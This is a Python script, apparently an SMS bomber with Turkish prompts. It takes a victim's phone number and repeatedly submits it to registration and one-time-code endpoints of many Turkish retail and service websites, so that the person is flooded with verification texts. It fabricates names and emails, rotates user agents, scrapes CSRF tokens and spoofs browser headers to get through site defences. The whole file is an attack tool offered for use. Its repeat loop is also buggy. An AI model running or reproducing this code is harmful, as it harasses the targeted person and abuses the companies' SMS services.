import random
import string
import requests
from bs4 import BeautifulSoup


pw = "12345678Abc."
password = "efe123R!"
def get_random_ua():
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
                   "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"]
    return random.choice(user_agents)

def random_string(string_length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(string_length))

def random_mail():
    mail_user = random_string()
    return mail_user + "@gmail.com"

rndua = get_random_ua()
mailuser = random_string()
rndmail = random_mail()
rndname = random_string(5)
rndsurname = random_string(5)

number = input("Telefon Numarasi Giriniz: ")
tekrar = input("Kac Kere Tekrar Etsin: ")
sifre = "sms" ## password change location
while tekrar:
  girdi_sifre = input("Sifrenizi Tekrar Giriniz: ")
  if girdi_sifre == sifre:

    print("Sifre Dogru Abicim Kod Calisiyor...")

    url = "https://www.vakkorama.com.tr/users/register/" 
    data = {"email":rndmail,"first_name":rndname,"last_name":rndsurname,"date_of_birth":"2000-05-11",
        "password":rndname+rndsurname,"phone":"0"+number,"sms_allowed":False,"email_allowed":False,
            "call_allowed":False,"gender":"male","confirm":True,"kvkk_confirm":True}
    headers = {"User-Agent":rndua, "Pragma":"no-cache", "Accept":"*/*","Content-Type":"application/json"}
    response = requests.post(url, json=data, headers=headers)

    url ="https://www.dsdamat.com/users/register/"
    data={"email":rndmail,"first_name":rndname,"last_name":rndsurname,"password":pw,"phone":"0"+number,"confirm":True,"email_allowed":True,"sms_allowed":True}
    headers={"User-Agent":rndua,"Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
    response = requests.post(url, data=data, headers=headers)



    url = "https://www.mudo.com.tr/users/register-with-loyalty/"
    data = {"first_name":rndname,"last_name":rndsurname,"email":rndmail,"phone":number,"dob_day":"01","dob_mont":"02","dob_year":"1982","date_of_birth":"1982-02-01","gender":"male","password":pw,"add_loyalty":False,"email_allowed":True,"sms_allowed":True,"confirm":True}
    headers={"User-Agent":rndua,"Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
    response = requests.post(url, data=data, headers=headers)


    url ="https://www.desa.com.tr/users/registration/"
    data ={"crsfmiddlewaretoken":"9999999999999999999999999999999999999999999999999999999999999999","first_name":rndname,"last_name":rndsurname,"email":rndmail,"date_of_birth":"1998-12-29","password":pw,"phone":"0"+number,"is_allowed":True,"confirm":True,"next":"%2F","sms_allowed":True,"email_allowed":True}
    headers={"User-Agent":rndua,"Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
    response = requests.post(url, data=data, headers=headers)


    url ="https://www.kigili.com/users/registration/"
    data ={"first_name":rndname,"last_name":rndsurname,"email":rndmail,"phone":"0"+number,"password":pw,"email_allowed":True,"sms_allowed":True,"confirm":True,"kvkk":True,"next":"%2F"}
    headers={"User-Agent":rndua,"Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
    response = requests.post(url, data=data, headers=headers)

    url = "https://www.pierrecardin.com.tr/users/registration/"
    data={"first_name":rndname,"last_name":rndsurname,"email":rndmail,"phone":"0"+number,"password":pw,"password2":pw,"email_allowed":True,"sms_allowed":True,"confirm":True}
    headers={"User-Agent":rndua,"Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
    response = requests.post(url, data=data, headers=headers)

    url="https://tr.uspoloassn.com/users/registration/"
    data ={"first_name":rndname,"last_name":rndsurname,"email":rndmail,"phone":"0"+number,"password":pw,"password2":pw,"confirm":True,"email_allowed":True,"sms_allowed":True}
    headers={"User-Agent":rndua,"Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
    response = requests.post(url, data=data, headers=headers)

    url = "https://api.ceptesok.com/api/users/sendsms"
    headers = {
        "origin": "https://www.sokmarket.com.tr",
        "positive-client": "ceptesok",
        "referer": "https://www.sokmarket.com.tr/",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "store-id": "2359",
        "user-agent":rndua,
        "Content-Type": "application/json"
    }

    data = {
        "mobile_number": number,
        "token_type": "register_token"
    }

    response = requests.post(url, json=data, headers=headers)
    #ENGLİSH_HOME_TOKEN
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    url = "https://www.englishhome.com/login/?next=/"
    response = requests.get(url, headers=headers)

    #ENGLİSH_HOME_TOKEN_AL
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

    #ENGLİSH_HOME
    url = "https://www.englishhome.com/enh_app/users/registration/"
    headers = {
        "origin": "https://www.englishhome.com",
        "referer": "https://www.englishhome.com/login/?next=/",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = {
        "csrfmiddlewaretoken": csrf_token,
        "first_name": rndname,
        "last_name": rndsurname,
        "email": rndmail,
        "phone": "0"+number,
        "password": pw,
        "email_allowed": "true",
        "sms_allowed": "true",
        "confirm": "true",
        "tom_pay_allowed": "true"
    }
    response = requests.post(url, data=data, headers=headers)
    
    url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
    headers = {
        "origin": "https://www.defacto.com.tr",
        "referer": "https://www.defacto.com.tr/",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
    }
    data = { "mobilePhone": "0"+number }

    response = requests.post(url, headers=headers, data=data)

    url = "https://www.joker.com.tr/kullanici/ajax/check-sms"
    headers = {
        "Origin": "https://www.joker.com.tr",
        "Referer": "https://www.joker.com.tr/kullanici/kayit",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = { "phone": number }

    response = requests.post(url, headers=headers, data=data)
    

    url ="https://www.migros.com.tr/rest/users/login/otp?reid="
    headers={

    "Origin":"https://www.migros.com.tr",
    "referer":"https://www.migros.com.tr/giris",
    "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/json"}
    data = {"phoneNumber": number}
    response = requests.post(url, headers=headers, data=data)
    
    url="https://www.hayatsu.com.tr/SignUp/SendOtp" 
    headers={
    "Origin":"https://www.hayatsu.com.tr",
    "referer":"https://www.hayatsu.com.tr/uye-ol",
    "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
    data = {"mobilePhoneNumber": number}

    response = requests.post(url, headers=headers, data=data)

    url="https://www.kigili.com/users/registration/"

    headers={
    "Origin":"https://www.kigili.com",
    "referer":"https://www.kigili.com/register/?next=/",
    "sec-ch-ua":"\"Opera GX\";v=\"77\", \"Chromium\";v=\"91\", \";Not A Brand\";v=\"99\"",
    "sec-ch-ua-mobile":"?0",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275",
    "x-requested-with":"XMLHttpRequest",
    "Content-Type":"application/x-www-form-urlencoded"
    }
    data={
    "first_name":rndname,
    "last_name":rndsurname,
    "email":rndmail,
    "phone":"0"+number,
    "password":pw,
    "confirm":True,
    "kvkk":True,
    "next":"%2F"
    }
    response = requests.post(url, headers=headers, data=data)
    url ="https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
    headers={
    "Content-Type":"application/json; charset=utf-8",
    "Content-Length":"39",
    "Connection":"keep-alive",
    "Server":"nginx/1.18.0",
    "X-Powered-By":"Express",
    "Vary":"X-HTTP-Method-Override, Accept-Encoding",
    "Access-Control-Allow-Methods":"POST, PUT, OPTIONS, DELETE, GET",
    "Access-Control-Allow-Origin":"http://localhost:8080",
    "Access-Control-Allow-Headers":"Origin, X-Requested-With, Content-Type, Accept",
    "Content-Language":"tr",
    "ETag":"W/\"27-4pIrFFpX5HLREsp3gIVke+MOCiE\"a"
    }
    data={"phoneNumber":number}
    response = requests.post(url, headers=headers, data=data)
            
    url = "https://ipapp.ipragaz.com.tr/login/checkout"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=headers)

    # İPRAGAZ_TOKEN_AL PARSE
    csrf_token = response.text.split("input type=\"hidden\" name=\"CSRFToken\" value=\"")[1].split("\"")[0]

    # İPRAGAZ REQUEST POST
    url = "https://ipapp.ipragaz.com.tr/login/register"
    data = {
        "name": "Ali Koc",
        "phone": number,
        "day": "5",
        "month": "9",
        "year": "2000",
        "carPlate": "34+++++tr+++++2142",
        "CSRFToken": csrf_token,
        "savePersonalData": "true"
    }
    headers = {
        "Origin": "https://ipapp.ipragaz.com.tr",
        "Referer": "https://ipapp.ipragaz.com.tr/login/checkout",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "traceparent": "00-1393eab31984f57820af8282a03180b0-de1b8ddd8ab7f267-01",
        "tracestate": "3231457@nr=0-1-3231457-241943575-de1b8ddd8ab7f267----1673017372824",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    response = requests.post(url, headers=headers, data=data)
    # BABYTURCO_TOKEN REQUEST GET
    url = "https://market.babyturco.com.tr/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=headers)

    # BABYTURCO_TOKEN_CEK PARSE
    token = response.text.split("input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"")[1].split("\"")[0]

    # BABYTURCO REQUEST POST
    url = "https://market.babyturco.com.tr/Customer/SendCode/"
    data = {
        "phoneNumber": "0"+number,
        "firstName": rndname,
        "lastName": rndsurname,
        "email": rndmail,
        "type": "customer",
        "campaingPermission": "true",
        "__RequestVerificationToken": token
    }
    headers = {
        "origin": "https://market.babyturco.com.tr",
        "referer": "https://market.babyturco.com.tr/",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    response = requests.post(url, data=data, headers=headers)

    # BABYTURCO_TOKEN REQUEST GET
    url = "https://market.babyturco.com.tr/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=headers)

    # BABYTURCO_TOKEN_CEK PARSE
    token = response.text.split("input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"")[1].split("\"")[0]

    # BABYTURCO REQUEST POST
    url = "https://market.babyturco.com.tr/Customer/SendCode/"
    data = {
        "phoneNumber": "0"+number,
        "firstName": rndname,
        "lastName": rndsurname,
        "email": rndmail,
        "type": "customer",
        "campaingPermission": "true",
        "__RequestVerificationToken": token
    }
    headers = {
        "origin": "https://market.babyturco.com.tr",
        "referer": "https://market.babyturco.com.tr/",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    response = requests.post(url, data=data, headers=headers)


    # SLEEPY_TOKEN REQUEST GET
    url = "https://market.sleepy.com.tr/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=headers)

    # SLEEPY_TOKEN_CEK PARSE
    token = response.text.split("input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"")[1].split("\"")[0]


    url = "https://market.sleepy.com.tr/Customer/SendCode/"
    data = {
    "phoneNumber": "0"+number,
    "firstName": rndname,
    "lastName": rndsurname,
    "email": rndmail,
    "type": "customer",
    "registerType": "1",
    "campaingPermission": "true",
    "__RequestVerificationToken": token
    }
    headers = {
    "origin": "https://market.sleepy.com.tr",
    "referer": "https://market.sleepy.com.tr/",
    "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform":"Windows",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    response = requests.post(url, data=data, headers=headers)

    url="https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
    headers={
    "Cache-Control":"no-cache",
    "Pragma":"no-cache",
    "Content-Type":"application/json; charset=utf-8",
    "Expires":"-1",
    "Server":"Microsoft-IIS/10.0",
    "X-AspNet-Version":"4.0.30319",
    "X-Powered-By":"ASP.NET",
    "Date":"Thu, 19Aug 2021 10:24:46 GMT",
    "Content-Length":"150",
    "Set-Cookie":"BIGipServermobile.metro-tr.com-443=!GYZmnaPqlBY1vd6lvMxGfxEf+4KbydXJh3eVMKAF0hcK7S4cj0fOUFnP6g8ZQEKAaBBQge2nfGeV1Z4=; path=/; Httponly; Secure",
    "Content-Type":"application/json"
    }
    data={
    "methodType":"5",
    "mobilePhoneNumber":"+90"+number,
    "taxNumber":""

    }
    response = requests.post(url, data=data, headers=headers)
    url ="https://www.a101.com.tr/users/otp-login/"
    headers={
    "origin":"https://www.a101.com.tr",
    "referer":"https://www.a101.com.tr/login/?next=/",
    "sec-ch-ua":"\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"Windows",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
    }
    data={
    "phone":"0"+number,
    "next":"%2F"
    } 
    response = requests.post(url, data=data, headers=headers)
    
    url="https://auth.kentkart.com/rl1/oauth/otp?region=036&authType=4&version=Web_1.6.2_1.0_CHROME_kentkart.web.mkentkart&lang=tr"
    headers={
    "Origin":"https://m.kentkart.com",
    "Referer":"https://m.kentkart.com/account/register",
    "sec-ch-ua":"\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"Windows",
    "Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Site":"same-site",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb",
    "Content-Type":"application/json" 
    }
    data={
    "clientId":"rH7S2",
    "loginType":"phone",
    "responseType":"code",
    "countryCode":"tr",
    "phoneNumber":number
    }
    response = requests.post(url, data=data, headers=headers)
    url="https://www.wmf.com.tr/users/register/"
    headers={
    "origin":"https://www.wmf.com.tr",
    "referer":"https://www.wmf.com.tr",
    "sec-ch-ua":"\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"Windows",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Content-Type":"application/json"
    }
    data={
    "first_name":rndname,
    "last_name":rndsurname,
    "email":rndmail,
    "phone":"0"+number,
    "gender":"male",
    "date_of_birth":"1998-04-05",
    "password":pw,
    "email_allowed":True,
    "sms_allowed":True,
    "confirm":True
    }
    response = requests.post(url, data=data, headers=headers)

    url="https://rentiva.com/api/Account/Login"
    headers={
    "origin":"https://rentiva.com",
    "referer":"https://rentiva.com/auth/identify/continue/phone",
    "sec-ch-ua":"\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"Windows",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Content-Type":"application/json"
    }
    data={
    "phone":number,
    "phonePeriod":"never"
    }
    tekrar -= 1

    response = requests.post(url, data=data, headers=headers)
  else:
        print("Sifre Abicim Dogru Gir.")
